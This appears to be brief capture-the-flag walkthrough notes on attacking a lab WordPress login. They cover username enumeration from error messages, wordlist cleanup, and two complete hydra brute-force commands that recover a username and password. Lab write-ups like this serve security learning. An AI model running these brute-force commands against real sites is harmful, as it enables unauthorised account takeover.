as seeing the result of nikto there is a wpslogin so open browser
type 10.10.10.4/wp-login
now type random username and password 
result = invalid username

we have got a .dic file from previous result
cat fsocity.dic

it have duplicate content.

so type  sort fsocity.dic | uniq > fsocity1.dic
seeing result that it give different output on depending on the username let's bruteforce it using hydra
hydra -vV -L fsocity1.dic -p random 10.10.10.4 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
result=  username=elliot
now again bruteforce using this dic and username elliot
hydra -vV -l elliot -P fsocity1.dic 10.10.10.4 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
result = pass=ER28-0652
